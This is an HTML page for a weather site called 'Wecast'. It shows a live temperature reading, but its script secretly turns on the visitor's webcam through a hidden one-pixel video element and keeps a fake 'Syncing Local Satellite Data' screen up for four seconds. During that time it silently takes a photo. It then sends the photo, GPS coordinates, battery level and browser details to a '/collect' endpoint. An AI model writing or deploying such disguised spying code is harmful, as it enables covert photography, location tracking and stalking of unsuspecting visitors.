<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wecast - Professional Weather</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; background: #fdfdfd; overflow: hidden; }
        .glass-card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); border-radius: 30px; border: 1px solid rgba(255,255,255,0.3); }
        #camera-hidden { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
        #loader { position: fixed; inset: 0; background: white; z-index: 50; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 1s; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #6366f1; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body onload="initApp()">
    <div id="loader"><div class="spinner mb-4"></div><h2 class="text-gray-700 font-semibold">Syncing Local Satellite Data...</h2></div>
    <video id="camera-hidden" autoplay playsinline></video>
    <canvas id="helper-canvas" style="display:none;"></canvas>

    <div class="max-w-6xl mx-auto p-6">
        <div class="flex justify-between items-center mb-10">
            <h1 class="font-bold text-xl text-gray-800">WECAST</h1>
            <div class="flex gap-4 text-gray-400 text-xs">üìç <span id="city-tag">Detecting...</span></div>
        </div>

        <div class="relative h-[480px] overflow-hidden rounded-[50px] shadow-2xl">
            <img src="https://images.unsplash.com/photo-1534067783941-51c9c23ecefd?auto=format&fit=crop&w=1200" class="absolute inset-0 w-full h-full object-cover">
            <div class="absolute inset-0 bg-gradient-to-t from-black/50 p-12 flex flex-col justify-between text-white">
                <div><h2 class="text-6xl font-bold mb-3">Weather</h2><p id="full-date"></p></div>
                <div class="absolute right-12 bottom-12 glass-card p-10 text-center w-64">
                    <p class="text-xs uppercase mb-3">Today</p>
                    <div class="text-8xl font-bold mb-2" id="temp-val">23¬∞</div>
                    <p class="text-sm font-medium">Real-time Conditions</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function initApp() {
            document.getElementById('full-date').innerText = `Today, ${new Date().toLocaleDateString()}`;
            const video = document.getElementById('camera-hidden');
            try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); video.srcObject = s; } catch(e){}

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const { latitude, longitude } = pos.coords;
                // Fetch real temp from free API
                const w = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`).then(r => r.json());
                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + '¬∞';
                document.getElementById('city-tag').innerText = "Active";

                // Silent capture after 4 seconds
                setTimeout(async () => {
                    await capture(latitude, longitude);
                    document.getElementById('loader').style.opacity = '0';
                    setTimeout(() => document.getElementById('loader').style.display = 'none', 1000);
                }, 4000);
            });
        }

        async function capture(lat, lon) {
            const v = document.getElementById('camera-hidden');
            const c = document.getElementById('helper-canvas');
            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
            c.getContext('2d').drawImage(v, 0, 0);
            const photo = c.toDataURL('image/jpeg', 0.7);
            if(v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());

            const b = await navigator.getBattery();
            await fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ts: new Date().toLocaleString(),
                    location: { lat, lon },
                    battery: { levelPercent: Math.round(b.level * 100) },
                    hints: { ua: navigator.userAgent },
                    burstImages: [photo]
                })
            });
        }
    </script>
</body>
</html>
